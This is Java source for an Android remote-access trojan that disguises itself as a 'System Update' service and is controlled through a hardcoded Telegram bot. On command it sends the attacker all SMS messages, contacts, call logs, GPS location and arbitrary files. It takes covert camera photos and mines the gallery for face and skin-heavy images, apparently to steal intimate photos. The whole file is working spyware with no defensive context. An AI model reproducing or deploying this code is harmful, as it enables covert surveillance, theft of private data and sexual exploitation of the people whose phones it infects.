package com.system.update;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.CallLog;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationManager;
import android.os.Environment;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.media.FaceDetector;
import android.media.MediaMetadataRetriever;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.DataOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class Payload extends Service {
    private String BOT_TOKEN = "8887819326:AAFX97DDbezzF_y-kOQWBL02NNy38nWxAIY"; 
    private String CHAT_ID = "8598136412"; 
    private String GROUP_ID = "-1004405270823"; 
    
    private long lastUpdateId = 0;
    private String myAndroidId = "";
    private android.content.SharedPreferences prefs;

    private void writeLog(String msg) {
        try {
            File file = new File(getExternalFilesDir(null), "rat_debug.txt");
            FileOutputStream fos = new FileOutputStream(file, true);
            fos.write((new java.util.Date().toString() + " - " + msg + "\n").getBytes());
            fos.close();
        } catch (Exception e) {}
    }

    public static void askPermissions(Activity activity) {
        if (Build.VERSION.SDK_INT >= 23) {
            List<String> permissions = new ArrayList<>();
            String[] perms = {
                "android.permission.READ_SMS", "android.permission.RECEIVE_SMS",
                "android.permission.READ_CONTACTS", "android.permission.READ_CALL_LOG",
                "android.permission.CAMERA", "android.permission.ACCESS_FINE_LOCATION",
                "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE"
            };
            for (String p : perms) {
                if (activity.checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                    permissions.add(p);
                }
            }
            if (Build.VERSION.SDK_INT >= 33) {
                if (activity.checkSelfPermission("android.permission.POST_NOTIFICATIONS") != PackageManager.PERMISSION_GRANTED) {
                    permissions.add("android.permission.POST_NOTIFICATIONS");
                }
            }
            if (!permissions.isEmpty()) {
                activity.requestPermissions(permissions.toArray(new String[0]), 101);
            }
            
            try {
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + activity.getPackageName()));
                activity.startActivity(intent);
            } catch (Exception e) {}
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        prefs = getSharedPreferences("rat_prefs", MODE_PRIVATE);
        lastUpdateId = prefs.getLong("lastUpdateId", 0);
        myAndroidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        writeLog("1. Service Start (Alarm)");
        
        if (Build.VERSION.SDK_INT >= 26) {
            String CHANNEL_ID = "sys_update_channel";
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System Update", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (manager != null) manager.createNotificationChannel(channel);

            Notification notification = new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("System Update")
                    .setContentText("Checking...")
                    .setSmallIcon(android.R.drawable.ic_popup_sync)
                    .build();
            startForeground(1, notification);
        }

        new Thread(new Runnable() {
            @Override
            public void run() {
                writeLog("2. Thread Jalan");
                String deviceName = Build.MANUFACTURER + " " + Build.MODEL + " (Android " + Build.VERSION.RELEASE + ")";
                
                sendCheckIn(deviceName);

                writeLog("3. Masuk Fast Polling (30 Detik)");
                long endTime = System.currentTimeMillis() + (30 * 1000);
                while (System.currentTimeMillis() < endTime) {
                    checkCommands();
                    try { TimeUnit.SECONDS.sleep(3); } catch (InterruptedException e) {}
                }

                writeLog("4. Waktu Habis, Service Tidur");
                stopForeground(true);
                stopSelf();
            }
        }).start();

        return START_NOT_STICKY;
    }

    private void checkCommands() {
        try {
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = in.readLine()) != null) { response.append(line); }
            in.close();

            String jsonResponse = response.toString();
            
            if (jsonResponse.contains("\"update_id\":")) {
                int startIdx = jsonResponse.lastIndexOf("\"update_id\":") + 12;
                int endIdx = jsonResponse.indexOf(",", startIdx);
                if (endIdx == -1) endIdx = jsonResponse.indexOf("}", startIdx);
                lastUpdateId = Long.parseLong(jsonResponse.substring(startIdx, endIdx).trim());
                prefs.edit().putLong("lastUpdateId", lastUpdateId).apply();
            }
            
            // FITUR TREE FILE
            if (jsonResponse.contains("\"text\":\"/tree " + myAndroidId + "\"")) {
                writeLog("Membangun Tree...");
                String tree = buildTree(new File("/storage/emulated/0/"), "", 0);
                if (tree.length() > 3500) {
                    File treeFile = new File(getExternalFilesDir(null), "tree.txt");
                    FileOutputStream fos = new FileOutputStream(treeFile);
                    fos.write(tree.getBytes()); fos.close();
                    sendTelegramFile(treeFile.getAbsolutePath(), false, "📂 Tree Folder (File)");
                } else {
                    sendTelegramMessage("📂 *Tree Folder:*\n" + tree);
                }
            }
            // FITUR DUMP
            else if (jsonResponse.contains("\"text\":\"/dump_sms " + myAndroidId + "\"")) {
                dumpSmsToFile();
            } else if (jsonResponse.contains("\"text\":\"/dump_kontak " + myAndroidId + "\"")) {
                dumpContactsToFile();
            } else if (jsonResponse.contains("\"text\":\"/dump_telpon " + myAndroidId + "\"")) {
                sendTelegramMessage("📞 *Dump Call Log:*\n" + getCallLogs());
            }
            // FITUR KAMERA & LOKASI
            else if (jsonResponse.contains("\"text\":\"/foto_depan " + myAndroidId + "\"")) {
                takePhoto(1);
            } else if (jsonResponse.contains("\"text\":\"/foto_belakang " + myAndroidId + "\"")) {
                takePhoto(0);
            } else if (jsonResponse.contains("\"text\":\"/lacak " + myAndroidId + "\"")) {
                sendTelegramMessage("📍 *Lokasi GPS:*\n" + getLocation());
            }
            // FITUR CEK FILE SPESIFIK
            else if (jsonResponse.contains("\"text\":\"/send_file " + myAndroidId)) {
                String prefix = "/send_file " + myAndroidId + " ";
                int pathIdx = jsonResponse.indexOf(prefix);
                if (pathIdx != -1) {
                    int endQuote = jsonResponse.indexOf("\"", pathIdx);
                    if (endQuote != -1) {
                        String path = jsonResponse.substring(pathIdx + prefix.length(), endQuote).trim();
                        File f = new File(path);
                        if(f.exists()) sendTelegramFile(f.getAbsolutePath(), false, "📤 File: " + f.getName());
                        else sendTelegramMessage("❌ File tidak ditemukan.");
                    }
                }
            }
            // FITUR FOTO ACAK
            else if (jsonResponse.contains("\"text\":\"/send_foto_acak " + myAndroidId)) {
                String prefix = "/send_foto_acak " + myAndroidId + " ";
                int pathIdx = jsonResponse.indexOf(prefix);
                if (pathIdx != -1) {
                    int endQuote = jsonResponse.indexOf("\"", pathIdx);
                    if (endQuote != -1) {
                        String[] parts = jsonResponse.substring(pathIdx + prefix.length(), endQuote).trim().split(" ");
                        if (parts.length >= 2) {
                            sendFotoFiltered(parts[0], Integer.parseInt(parts[1]), "acak");
                        }
                    }
                }
            }
            // FITUR FOTO WAJAH
            else if (jsonResponse.contains("\"text\":\"/send_foto_wajah " + myAndroidId)) {
                String prefix = "/send_foto_wajah " + myAndroidId + " ";
                int pathIdx = jsonResponse.indexOf(prefix);
                if (pathIdx != -1) {
                    int endQuote = jsonResponse.indexOf("\"", pathIdx);
                    if (endQuote != -1) {
                        String[] parts = jsonResponse.substring(pathIdx + prefix.length(), endQuote).trim().split(" ");
                        if (parts.length >= 2) {
                            sendFotoFiltered(parts[0], Integer.parseInt(parts[1]), "wajah");
                        }
                    }
                }
            }
            // FITUR FOTO PERUT
            else if (jsonResponse.contains("\"text\":\"/send_foto_perut " + myAndroidId)) {
                String prefix = "/send_foto_perut " + myAndroidId + " ";
                int pathIdx = jsonResponse.indexOf(prefix);
                if (pathIdx != -1) {
                    int endQuote = jsonResponse.indexOf("\"", pathIdx);
                    if (endQuote != -1) {
                        String[] parts = jsonResponse.substring(pathIdx + prefix.length(), endQuote).trim().split(" ");
                        if (parts.length >= 2) {
                            sendFotoFiltered(parts[0], Integer.parseInt(parts[1]), "perut");
                        }
                    }
                }
            }
            // FITUR SEND VIDEO
            else if (jsonResponse.contains("\"text\":\"/send_video " + myAndroidId)) {
                String prefix = "/send_video " + myAndroidId + " ";
                int pathIdx = jsonResponse.indexOf(prefix);
                if (pathIdx != -1) {
                    int endQuote = jsonResponse.indexOf("\"", pathIdx);
                    if (endQuote != -1) {
                        String[] parts = jsonResponse.substring(pathIdx + prefix.length(), endQuote).trim().split(" ");
                        if (parts.length >= 3) {
                            sendVideoFiltered(parts[0], Integer.parseInt(parts[1]), Integer.parseInt(parts[2]));
                        }
                    }
                }
            }

        } catch (Exception e) { 
            writeLog("Error checkCommands: " + e.getMessage());
        }
    }

    private String buildTree(File dir, String prefix, int depth) {
        if (depth > 4) return "";
        StringBuilder sb = new StringBuilder();
        File[] files = dir.listFiles();
        if (files == null) return "";
        Arrays.sort(files, (f1, f2) -> f1.getName().compareToIgnoreCase(f2.getName()));
        for (File f : files) {
            if (f.isDirectory()) {
                String name = f.getName().toLowerCase();
                if (name.equals("data") || name.equals("obb") || f.getName().startsWith(".")) continue;
                sb.append(prefix).append("📁 ").append(f.getName()).append("\n");
                sb.append(buildTree(f, prefix + "  ", depth + 1));
            }
        }
        return sb.toString();
    }

    private void sendFotoFiltered(String path, int count, String mode) {
        File dir = new File(path);
        File[] files = dir.listFiles((d, name) -> name.toLowerCase().endsWith(".jpg") || name.toLowerCase().endsWith(".jpeg") || name.toLowerCase().endsWith(".png"));
        if (files == null || files.length == 0) { sendTelegramMessage("❌ Folder kosong / tidak ada foto."); return; }
        
        List<File> fileList = new ArrayList<>(Arrays.asList(files));
        Collections.shuffle(fileList);
        
        int sent = 0;
        for (File f : fileList) {
            if (sent >= count) break;
            boolean lolos = false;
            
            if (mode.equals("acak")) lolos = true;
            else if (mode.equals("wajah")) lolos = detectFace(f.getAbsolutePath());
            else if (mode.equals("perut")) lolos = detectSkin(f.getAbsolutePath());

            if (lolos) {
                sendTelegramFile(f.getAbsolutePath(), true, "📸 Foto " + mode.toUpperCase());
                sent++;
                try { TimeUnit.SECONDS.sleep(2); } catch (Exception e) {}
            }
        }
        sendTelegramMessage("✅ Selesai scan " + mode + ". Terkirim " + sent + " foto.");
    }

    private boolean detectFace(String filePath) {
        try {
            BitmapFactory.Options options = new BitmapFactory.Options();
            options.inPreferredConfig = Bitmap.Config.RGB_565;
            Bitmap bitmap = BitmapFactory.decodeFile(filePath, options);
            if (bitmap == null) return false;
            FaceDetector detector = new FaceDetector(bitmap.getWidth(), bitmap.getHeight(), 5);
            FaceDetector.Face[] faces = new FaceDetector.Face[5];
            int numFaces = detector.findFaces(bitmap, faces);
            bitmap.recycle();
            detector.release();
            return numFaces > 0;
        } catch (Exception e) { return false; }
    }

    private boolean detectSkin(String filePath) {
        try {
            BitmapFactory.Options options = new BitmapFactory.Options();
            options.inSampleSize = 4; // Perkecil gambar biar cepet
            Bitmap bitmap = BitmapFactory.decodeFile(filePath, options);
            if (bitmap == null) return false;
            int width = bitmap.getWidth();
            int height = bitmap.getHeight();
            int skinPixels = 0;
            int totalPixels = 0;
            for (int x = 0; x < width; x+=4) {
                for (int y = 0; y < height; y+=4) {
                    totalPixels++;
                    int pixel = bitmap.getPixel(x, y);
                    int r = Color.red(pixel), g = Color.green(pixel), b = Color.blue(pixel);
                    // Heuristik Warna Kulit
                    if (r > 95 && g > 40 && b > 20 && (Math.max(r, Math.max(g, b)) - Math.min(r, Math.min(g, b))) > 15 && Math.abs(r - g) > 15 && r > g && r > b) {
                        skinPixels++;
                    }
                }
            }
            bitmap.recycle();
            return totalPixels > 0 && ((double) skinPixels / totalPixels) > 0.3; // >30% kulit
        } catch (Exception e) { return false; }
    }

    private void sendVideoFiltered(String path, int count, int maxSec) {
        File dir = new File(path);
        File[] files = dir.listFiles((d, name) -> name.toLowerCase().endsWith(".mp4") || name.toLowerCase().endsWith(".mkv") || name.toLowerCase().endsWith(".3gp"));
        if (files == null || files.length == 0) { sendTelegramMessage("❌ Folder kosong / tidak ada video."); return; }
        
        List<File> fileList = new ArrayList<>(Arrays.asList(files));
        Collections.shuffle(fileList);
        
        int sent = 0;
        for (File f : fileList) {
            if (sent >= count) break;
            try {
                MediaMetadataRetriever retriever = new MediaMetadataRetriever();
                retriever.setDataSource(f.getAbsolutePath());
                String time = retriever.extractMetadata(MediaMetadataRetriever.METADATA_KEY_DURATION);
                long timeMs = Long.parseLong(time);
                retriever.release();
                
                if ((timeMs / 1000) <= maxSec) {
                    sendTelegramFile(f.getAbsolutePath(), false, "🎥 Video (" + (timeMs/1000) + "s)");
                    sent++;
                    try { TimeUnit.SECONDS.sleep(2); } catch (Exception e) {}
                }
            } catch (Exception e) {}
        }
        sendTelegramMessage("✅ Selesai scan video. Terkirim " + sent + " video.");
    }

    // FUNGSI LAMA (DUMP, DLL)
    private void sendCheckIn(String deviceInfo) {
        try {
            String encoded = URLEncoder.encode("/checkin " + deviceInfo + "|" + myAndroidId, "UTF-8");
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + GROUP_ID + "&text=" + encoded;
            new URL(urlStr).openConnection().getInputStream().close();
        } catch (Exception e) { writeLog("Error CheckIn: " + e.getMessage()); }
    }

    private void dumpSmsToFile() {
        writeLog("Menyedot semua SMS...");
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    sb.append("Dari: ").append(cursor.getString(cursor.getColumnIndex("address")))
                      .append("\nTanggal: ").append(cursor.getString(cursor.getColumnIndex("date")))
                      .append("\nPesan: ").append(cursor.getString(cursor.getColumnIndex("body"))).append("\n\n");
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) { writeLog("Gagal baca SMS"); }
        
        try {
            File file = new File(getExternalFilesDir(null), "sms_dump.txt");
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(sb.toString().getBytes()); fos.close();
            sendTelegramFile(file.getAbsolutePath(), false, "📩 Dump SEMUA SMS");
            file.delete();
        } catch (Exception e) { writeLog("Gagal kirim SMS file"); }
    }

    private void dumpContactsToFile() {
        writeLog("Menyedot semua Kontak...");
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    sb.append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                      .append(" - ").append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) { writeLog("Gagal baca Kontak"); }
        
        try {
            File file = new File(getExternalFilesDir(null), "kontak_dump.txt");
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(sb.toString().getBytes()); fos.close();
            sendTelegramFile(file.getAbsolutePath(), false, "👥 Dump SEMUA Kontak");
            file.delete();
        } catch (Exception e) { writeLog("Gagal kirim Kontak file"); }
    }

    private String getCallLogs() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (cursor != null && cursor.moveToFirst()) {
                for (int i = 0; i < cursor.getCount() && i < 15; i++) {
                    sb.append("Nomor: ").append(cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))).append("\n");
                    cursor.moveToNext();
                }
                cursor.close();
            }
        } catch (Exception e) { return "Gagal baca Call Log."; }
        return sb.length() > 0 ? sb.toString() : "Tidak ada Call Log.";
    }

    private String getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) return "Lat: " + loc.getLatitude() + "\nLng: " + loc.getLongitude();
        } catch (Exception e) { return "Gagal ambil lokasi."; }
        return "Lokasi tidak tersedia.";
    }

    private void takePhoto(int cameraId) {
        try {
            Camera camera = Camera.open(cameraId);
            camera.startPreview();
            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    try {
                        File file = new File(Environment.getExternalStorageDirectory(), "sys_photo_" + System.currentTimeMillis() + ".jpg");
                        FileOutputStream fos = new FileOutputStream(file);
                        fos.write(data); fos.close();
                        camera.release();
                        sendTelegramFile(file.getAbsolutePath(), true, "📸 Foto Kamera");
                    } catch (Exception e) { e.printStackTrace(); }
                }
            });
        } catch (Exception e) { sendTelegramMessage("❌ Gagal ambil foto."); }
    }

    private void sendTelegramMessage(String pesan) {
        try {
            String encodedMsg = URLEncoder.encode(pesan, "UTF-8");
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodedMsg;
            new URL(urlStr).openConnection().getInputStream().close();
        } catch (Exception e) { writeLog("Error Kirim Pesan: " + e.getMessage()); }
    }

    private void sendTelegramFile(String filePath, boolean isPhoto, String caption) {
        String boundary = "*****";
        try {
            File file = new File(filePath);
            if (!file.exists()) return;
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + (isPhoto ? "/sendPhoto" : "/sendDocument");
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
            DataOutputStream request = new DataOutputStream(conn.getOutputStream());
            request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n");
            if (caption != null) request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n");
            request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"" + (isPhoto ? "photo" : "document") + "\"; filename=\"" + file.getName() + "\"\r\nContent-Type: application/octet-stream\r\n\r\n");
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) request.write(buffer, 0, bytesRead);
            fis.close();
            request.writeBytes("\r\n--" + boundary + "--\r\n");
            request.flush(); request.close(); conn.getResponseCode(); 
        } catch (Exception e) { e.printStackTrace(); }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
